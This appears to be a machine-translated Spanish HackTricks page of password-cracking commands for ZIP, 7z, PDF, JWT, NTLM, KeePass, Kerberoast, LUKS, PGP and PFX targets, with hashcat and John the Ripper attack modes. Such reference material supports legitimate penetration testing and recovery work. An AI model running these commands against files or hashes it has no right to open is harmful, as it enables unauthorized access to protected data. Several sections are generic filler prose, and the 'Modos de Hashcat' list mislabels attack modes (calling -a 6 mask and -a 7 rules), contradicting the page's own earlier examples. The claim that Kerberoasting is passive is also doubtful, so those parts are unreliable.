* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Revisa esto antes de intentar realizar un ataque de fuerza bruta a un Hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Ataque de fuerza bruta con texto plano conocido en archivos zip

Necesitas conocer el **texto plano** (o parte del texto plano) **de un archivo contenido dentro** del zip encriptado. Puedes verificar los **nombres de archivo y el tamaño de los archivos contenidos dentro** de un zip encriptado ejecutando: **`7z l encrypted.zip`**\
Descarga [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) desde la página de lanzamientos.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

El método de fuerza bruta se puede utilizar para descifrar contraseñas de archivos comprimidos en formato 7z. El formato 7z es conocido por su alta tasa de compresión y su capacidad para cifrar archivos con contraseñas.

Para llevar a cabo un ataque de fuerza bruta en un archivo 7z, se necesita una lista de posibles contraseñas. Esta lista puede ser generada utilizando diccionarios de contraseñas comunes, combinaciones de palabras o caracteres, o mediante el uso de herramientas de generación de contraseñas.

Una vez que se tiene la lista de contraseñas, se utiliza un programa de fuerza bruta para probar cada contraseña en el archivo 7z. El programa intentará todas las combinaciones posibles hasta encontrar la contraseña correcta.

Es importante tener en cuenta que el proceso de fuerza bruta puede llevar mucho tiempo, especialmente si el archivo 7z está protegido con una contraseña fuerte y larga. Además, algunos programas de fuerza bruta pueden ser detectados por sistemas de seguridad y bloqueados.

Para aumentar las posibilidades de éxito en un ataque de fuerza bruta en un archivo 7z, se pueden utilizar técnicas como la optimización de la lista de contraseñas, la utilización de hardware especializado o la distribución del ataque en múltiples sistemas.

Es importante destacar que el uso de la fuerza bruta para descifrar contraseñas sin el consentimiento del propietario del archivo es ilegal y puede tener consecuencias legales graves. La fuerza bruta solo debe ser utilizada en entornos legales y con el permiso del propietario del archivo.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
# Fuerza bruta

La fuerza bruta es una técnica de hacking que implica probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Es un enfoque simple pero efectivo para obtener acceso no autorizado a sistemas protegidos por contraseña.

La fuerza bruta se basa en la premisa de que, dado el tiempo suficiente, se puede probar cada posible combinación de caracteres hasta encontrar la contraseña correcta. Esto se logra utilizando programas automatizados que generan y prueban contraseñas en rápida sucesión.

Existen diferentes métodos y herramientas disponibles para llevar a cabo ataques de fuerza bruta. Algunas de las herramientas más populares incluyen Hydra, Medusa y John the Ripper. Estas herramientas permiten a los hackers automatizar el proceso de prueba de contraseñas y acelerar el tiempo necesario para encontrar la contraseña correcta.

Es importante tener en cuenta que la fuerza bruta puede ser un proceso lento y consumir muchos recursos computacionales. Además, algunos sistemas tienen medidas de seguridad en su lugar para detectar y bloquear ataques de fuerza bruta, como bloquear una cuenta después de un número determinado de intentos fallidos.

A pesar de sus limitaciones, la fuerza bruta sigue siendo una técnica de hacking popular debido a su simplicidad y efectividad. Es por eso que es importante que los usuarios utilicen contraseñas seguras y eviten el uso de contraseñas débiles o predecibles.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Contraseña del propietario de PDF

Para descifrar una contraseña del propietario de PDF, consulta esto: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Descifrado de NTLM

El descifrado de NTLM es una técnica utilizada para obtener contraseñas mediante la fuerza bruta. NTLM (NT LAN Manager) es un protocolo de autenticación utilizado en sistemas operativos Windows. 

La fuerza bruta es un método en el que se prueban todas las combinaciones posibles de contraseñas hasta encontrar la correcta. En el caso del descifrado de NTLM, se generan hashes de contraseñas y se comparan con el hash objetivo para encontrar una coincidencia.

Existen varias herramientas y recursos disponibles para llevar a cabo el descifrado de NTLM. Algunas de las herramientas más populares incluyen John the Ripper, Hashcat y oclHashcat. Estas herramientas utilizan técnicas avanzadas de procesamiento de hashes para acelerar el proceso de descifrado.

Es importante tener en cuenta que el descifrado de NTLM es una actividad ilegal sin el consentimiento del propietario del sistema. Solo se debe realizar como parte de una evaluación de seguridad autorizada, como una prueba de penetración.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass es un gestor de contraseñas de código abierto que te permite almacenar y gestionar de forma segura tus contraseñas. Utiliza una base de datos encriptada para almacenar tus contraseñas y otros datos confidenciales. Keepass utiliza un algoritmo de cifrado fuerte para proteger tus contraseñas y ofrece funciones adicionales como la generación automática de contraseñas seguras.

Una técnica común utilizada para intentar acceder a una base de datos de Keepass es el ataque de fuerza bruta. En este tipo de ataque, un hacker intenta adivinar la contraseña correcta probando diferentes combinaciones de caracteres hasta encontrar la correcta. Esto puede llevar mucho tiempo y requiere de una gran cantidad de recursos computacionales.

Para proteger tu base de datos de Keepass contra ataques de fuerza bruta, es importante elegir una contraseña segura y compleja. Una contraseña segura debe tener una combinación de letras mayúsculas y minúsculas, números y caracteres especiales. Además, es recomendable utilizar una contraseña larga para aumentar la seguridad.

Otra medida de seguridad importante es habilitar la función de bloqueo después de un número determinado de intentos fallidos de inicio de sesión. Esto evitará que un atacante continúe intentando adivinar la contraseña después de un cierto número de intentos.

Recuerda también mantener tu base de datos de Keepass actualizada con las últimas actualizaciones de seguridad y utilizar una versión de Keepass que sea compatible con tu sistema operativo. Mantener tus contraseñas seguras es fundamental para proteger tu información personal y evitar posibles ataques.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting es una técnica de ataque que se utiliza para obtener contraseñas débiles de cuentas de servicio en un dominio de Active Directory. Esta técnica se basa en la debilidad de las contraseñas de servicio que se almacenan en el dominio en forma de hashes de Kerberos.

El proceso de keberoasting comienza identificando las cuentas de servicio en el dominio. Estas cuentas de servicio suelen ser utilizadas por aplicaciones y servicios para autenticarse en el dominio. Una vez identificadas, se extraen los hashes de Kerberos asociados a estas cuentas.

Luego, se utiliza una herramienta como "Rubeus" para solicitar un ticket de servicio para cada cuenta de servicio identificada. Estos tickets de servicio contienen los hashes de Kerberos necesarios para realizar el ataque de keberoasting.

Una vez obtenidos los tickets de servicio, se extraen los hashes de Kerberos y se utilizan herramientas como "John the Ripper" o "Hashcat" para realizar un ataque de fuerza bruta y descifrar las contraseñas débiles asociadas a estos hashes.

Es importante destacar que keberoasting es un ataque pasivo, lo que significa que no se requiere interactuar directamente con el sistema objetivo. Esto lo hace especialmente útil en escenarios donde no se permite el acceso directo a los sistemas o cuando se desea minimizar la detección.

Para protegerse contra el ataque de keberoasting, es recomendable implementar políticas de contraseñas fuertes para las cuentas de servicio y realizar auditorías regulares para identificar y corregir contraseñas débiles.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Imagen de Lucks

#### Método 1

Instalar: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Método 2

Brute force is a common method used in hacking to gain unauthorized access to a system or account. It involves systematically trying all possible combinations of passwords until the correct one is found.

To perform a brute force attack, hackers use automated tools that can generate and test thousands or even millions of password combinations per second. These tools often rely on dictionaries of commonly used passwords or employ algorithms to generate variations of words, numbers, and symbols.

Brute force attacks can be time-consuming and resource-intensive, especially if the target system has implemented security measures such as account lockouts or CAPTCHA. However, they can still be effective against weak or easily guessable passwords.

To protect against brute force attacks, it is important to use strong, unique passwords that are not easily guessable. Additionally, implementing measures such as account lockouts, CAPTCHA, and rate limiting can help mitigate the risk of a successful brute force attack.

While brute force attacks can be a powerful tool for hackers, they are also detectable. Monitoring for multiple failed login attempts, unusual patterns of login activity, or an excessive number of requests can help identify and prevent brute force attacks.

Overall, understanding the concept of brute force attacks and implementing appropriate security measures can help protect against unauthorized access to systems and accounts.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Otro tutorial de BF de Luks: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Clave privada PGP/GPG

La clave privada PGP/GPG es un componente esencial en la encriptación de datos. Esta clave se utiliza para desencriptar mensajes que han sido encriptados con la clave pública correspondiente. La clave privada debe mantenerse en secreto y protegida, ya que su compromiso podría permitir a un atacante acceder a la información encriptada.

La generación de una clave privada PGP/GPG implica el uso de algoritmos criptográficos fuertes y la selección de una contraseña segura. Es importante elegir una contraseña que sea única y difícil de adivinar para evitar que un atacante pueda comprometer la clave privada.

Además, es recomendable realizar copias de seguridad de la clave privada en un lugar seguro, como un dispositivo de almacenamiento externo o una ubicación en la nube. Esto garantiza que, en caso de pérdida o daño del dispositivo original, se pueda acceder a la clave privada y restaurar la capacidad de desencriptar los mensajes.

Es fundamental proteger la clave privada PGP/GPG y tomar medidas para prevenir su filtración. Esto incluye evitar compartir la clave privada con terceros no autorizados y utilizar medidas de seguridad adicionales, como el cifrado de disco y el uso de autenticación de dos factores, para proteger el dispositivo en el que se almacena la clave privada.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Utiliza [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) y luego john

### Columna protegida por contraseña en Open Office

Si tienes un archivo xlsx con una columna protegida por contraseña, puedes desprotegerla:

* **Cárgalo en Google Drive** y la contraseña se eliminará automáticamente
* Para **eliminarla** **manualmente**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificados PFX

Los certificados PFX son archivos que contienen tanto la clave privada como el certificado público. Estos archivos se utilizan comúnmente en entornos de seguridad para autenticar y cifrar la comunicación entre sistemas. Los certificados PFX se pueden utilizar en una variedad de aplicaciones, como servidores web, servicios de correo electrónico y VPN.

### Ataques de fuerza bruta

Un ataque de fuerza bruta es una técnica utilizada por los hackers para descifrar contraseñas o claves de cifrado mediante la prueba de todas las combinaciones posibles hasta encontrar la correcta. Este tipo de ataque puede ser extremadamente efectivo, pero también puede llevar mucho tiempo dependiendo de la complejidad de la contraseña o clave.

Existen varias herramientas y recursos disponibles para llevar a cabo ataques de fuerza bruta, como programas de software especializados y diccionarios de contraseñas. Estas herramientas pueden automatizar el proceso de prueba de todas las combinaciones posibles, lo que acelera el tiempo necesario para descifrar una contraseña o clave.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están estrictamente prohibidos sin el consentimiento explícito del propietario del sistema o recurso que se está atacando. Además, es importante utilizar contraseñas seguras y claves de cifrado fuertes para protegerse contra este tipo de ataques.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Herramientas

**Ejemplos de hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Identificador de hash
```bash
hash-identifier
> <HASH>
```
### Listas de palabras

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Contraseñas**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Herramientas de generación de listas de palabras**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generador avanzado de combinaciones de teclado con caracteres base, mapa de teclado y rutas configurables.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutación de John

Lee _**/etc/john/john.conf**_ y configúralo.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Ataques de Hashcat

* **Ataque de lista de palabras** (`-a 0`) con reglas

**Hashcat** ya viene con una **carpeta que contiene reglas** pero puedes encontrar [**otras reglas interesantes aquí**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Ataque de combinación de listas de palabras**

Es posible **combinar 2 listas de palabras en 1** con hashcat.\
Si la lista 1 contiene la palabra **"hello"** y la segunda contiene 2 líneas con las palabras **"world"** y **"earth"**. Se generarán las palabras `helloworld` y `helloearth`.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Ataque de máscara** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Ataque de Wordlist + Máscara (`-a 6`) / Máscara + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modos de Hashcat

Hashcat es una herramienta de cracking de contraseñas que admite varios modos de ataque. Estos modos determinan cómo se procesan y se prueban las contraseñas. A continuación se presentan los modos de Hashcat más comunes:

- **Modo de ataque de diccionario (modo 0):** Este modo utiliza un archivo de diccionario que contiene una lista de palabras o combinaciones de palabras para probar como contraseñas. Hashcat probará cada entrada del diccionario hasta encontrar una coincidencia.

- **Modo de ataque de fuerza bruta (modo 3):** En este modo, Hashcat probará todas las combinaciones posibles de caracteres para encontrar la contraseña correcta. Este modo es extremadamente lento y generalmente se utiliza como último recurso cuando otros métodos de ataque no tienen éxito.

- **Modo de ataque de máscara (modo 6):** En este modo, se especifica una máscara que define el patrón de la contraseña. Hashcat generará todas las combinaciones posibles de caracteres que se ajusten a la máscara especificada.

- **Modo de ataque de reglas (modo 7):** Este modo utiliza reglas predefinidas o personalizadas para modificar las contraseñas del diccionario antes de probarlas. Estas reglas pueden incluir cambios en la capitalización, la adición de números o símbolos, entre otros.

- **Modo de ataque de combinación (modo 1):** En este modo, Hashcat combina palabras de un archivo de diccionario para formar contraseñas. Puede especificar el número de palabras que se combinarán y el orden en que se combinarán.

- **Modo de ataque de ataque híbrido (modo 6):** Este modo combina el ataque de diccionario con el ataque de fuerza bruta. Hashcat probará primero todas las entradas del diccionario y luego realizará un ataque de fuerza bruta en las contraseñas que no se encontraron en el diccionario.

Estos son solo algunos de los modos de ataque que ofrece Hashcat. Cada modo tiene sus propias ventajas y desventajas, y la elección del modo dependerá del escenario de hacking y de las características de la contraseña que se está intentando crackear.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Descifrando Hashes de Linux - archivo /etc/shadow

El archivo `/etc/shadow` en sistemas Linux almacena las contraseñas de los usuarios en forma de hashes. Estos hashes son generados utilizando algoritmos criptográficos como MD5, SHA-256, etc. En este capítulo, exploraremos una técnica comúnmente utilizada para descifrar estos hashes: el ataque de fuerza bruta.

## Ataque de Fuerza Bruta

El ataque de fuerza bruta es un método utilizado para descifrar contraseñas probando todas las combinaciones posibles hasta encontrar la correcta. En el contexto de descifrar hashes de contraseñas de Linux, esto implica generar hashes para todas las posibles contraseñas y compararlos con los hashes almacenados en el archivo `/etc/shadow`.

Existen varias herramientas disponibles para realizar ataques de fuerza bruta en hashes de Linux, como John the Ripper, Hashcat, etc. Estas herramientas utilizan diccionarios de contraseñas predefinidos o generan combinaciones de contraseñas basadas en reglas específicas.

## Diccionarios de Contraseñas

Un diccionario de contraseñas es una lista de palabras o combinaciones de palabras que se utilizan para probar contraseñas durante un ataque de fuerza bruta. Estos diccionarios pueden ser generados por el atacante o descargados de fuentes públicas.

Es importante tener en cuenta que los diccionarios de contraseñas deben ser lo más exhaustivos posible, ya que las contraseñas comunes o predecibles son las primeras en ser probadas durante un ataque de fuerza bruta.

## Reglas de Generación de Contraseñas

Además de los diccionarios de contraseñas, las herramientas de fuerza bruta también pueden utilizar reglas de generación de contraseñas. Estas reglas definen patrones o transformaciones que se aplican a las palabras del diccionario para generar combinaciones adicionales.

Algunas reglas comunes incluyen la adición de números o símbolos al final de las palabras, la sustitución de letras por números o símbolos similares, la inversión de palabras, entre otras.

## Consideraciones de Seguridad

Es importante tener en cuenta que el uso de contraseñas seguras y robustas es fundamental para proteger los sistemas. Los administradores de sistemas deben implementar políticas de contraseñas que requieran una combinación de letras mayúsculas y minúsculas, números y símbolos, y evitar el uso de contraseñas comunes o predecibles.

Además, es recomendable utilizar funciones de hash más seguras, como SHA-512, en lugar de algoritmos más débiles como MD5. Esto dificulta aún más el proceso de descifrado de los hashes de contraseñas.

En resumen, el ataque de fuerza bruta es una técnica comúnmente utilizada para descifrar hashes de contraseñas de Linux almacenados en el archivo `/etc/shadow`. Los diccionarios de contraseñas y las reglas de generación de contraseñas son herramientas clave en este tipo de ataques. Sin embargo, es fundamental implementar contraseñas seguras y utilizar algoritmos de hash más fuertes para garantizar la seguridad de los sistemas.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Fuerza bruta

La fuerza bruta es una técnica comúnmente utilizada para descifrar contraseñas en sistemas Windows. Consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Aunque es un método lento y consume muchos recursos, puede ser efectivo en ciertos casos.

## Herramientas de fuerza bruta

Existen varias herramientas de fuerza bruta disponibles que pueden ayudarte en el proceso de descifrado de contraseñas de Windows. Algunas de las más populares son:

- **John the Ripper**: una herramienta de código abierto que puede descifrar contraseñas utilizando ataques de fuerza bruta y otros métodos.
- **Hashcat**: una herramienta de descifrado de contraseñas de alto rendimiento que admite una amplia gama de algoritmos de hash.
- **Cain & Abel**: una herramienta de recuperación de contraseñas que también puede realizar ataques de fuerza bruta.

## Ataques de fuerza bruta

Existen diferentes tipos de ataques de fuerza bruta que puedes utilizar para descifrar contraseñas de Windows:

- **Ataque de diccionario**: este tipo de ataque utiliza una lista de palabras comunes o contraseñas conocidas para probar combinaciones.
- **Ataque de fuerza bruta pura**: en este tipo de ataque, se prueban todas las combinaciones posibles de caracteres hasta encontrar la contraseña correcta.
- **Ataque de fuerza bruta híbrida**: este tipo de ataque combina un ataque de diccionario con un ataque de fuerza bruta pura, lo que permite probar una amplia gama de combinaciones.

## Consideraciones de seguridad

Es importante tener en cuenta que el uso de la fuerza bruta para descifrar contraseñas es una actividad ilegal sin el consentimiento del propietario del sistema. Además, muchos sistemas implementan medidas de seguridad para detectar y bloquear ataques de fuerza bruta.

Siempre es recomendable obtener el permiso adecuado y utilizar estas técnicas solo con fines legítimos, como pruebas de penetración autorizadas o auditorías de seguridad.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Fuerza Bruta de Hashes de Aplicaciones Comunes

La fuerza bruta es una técnica comúnmente utilizada para descifrar contraseñas o hashes de contraseñas. Consiste en probar todas las combinaciones posibles hasta encontrar la correcta. En el caso de los hashes de contraseñas de aplicaciones comunes, se pueden utilizar diferentes herramientas y recursos para llevar a cabo este proceso.

## Herramientas de Fuerza Bruta

Existen varias herramientas populares que se pueden utilizar para realizar ataques de fuerza bruta en hashes de contraseñas. Algunas de ellas incluyen:

- **John the Ripper**: una herramienta de cracking de contraseñas que admite una amplia variedad de formatos de hash.
- **Hashcat**: una herramienta de cracking de contraseñas que utiliza la potencia de procesamiento de la GPU para acelerar el proceso de fuerza bruta.
- **Hydra**: una herramienta de cracking de contraseñas en línea que puede realizar ataques de fuerza bruta en servicios como SSH, FTP, HTTP, entre otros.

## Diccionarios de Contraseñas

Además de las herramientas de fuerza bruta, también es importante contar con diccionarios de contraseñas. Estos diccionarios contienen una lista de palabras comunes, combinaciones de palabras y patrones que se utilizan con frecuencia como contraseñas. Algunos ejemplos de diccionarios populares son:

- **RockYou**: un diccionario de contraseñas que contiene millones de contraseñas filtradas de una brecha de seguridad.
- **SecLists**: una colección de diccionarios y listas de palabras utilizadas en ataques de fuerza bruta.

## Recursos Adicionales

Además de las herramientas y diccionarios mencionados anteriormente, existen otros recursos que pueden ser útiles durante un ataque de fuerza bruta. Algunos de ellos incluyen:

- **Rainbow tables**: tablas precalculadas que contienen pares de valores hash y contraseñas correspondientes, lo que acelera el proceso de descifrado.
- **Servicios en la nube**: algunos proveedores de servicios en la nube ofrecen plataformas de cracking de contraseñas como un servicio, lo que permite aprovechar la potencia de procesamiento de sus servidores.

Es importante tener en cuenta que la fuerza bruta es un método intensivo en recursos y puede llevar mucho tiempo, especialmente si se utilizan contraseñas complejas. Además, es una técnica que puede ser detectada por sistemas de seguridad y bloqueada. Por lo tanto, se recomienda utilizarla con precaución y solo con fines legales y éticos, como parte de una evaluación de seguridad autorizada.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
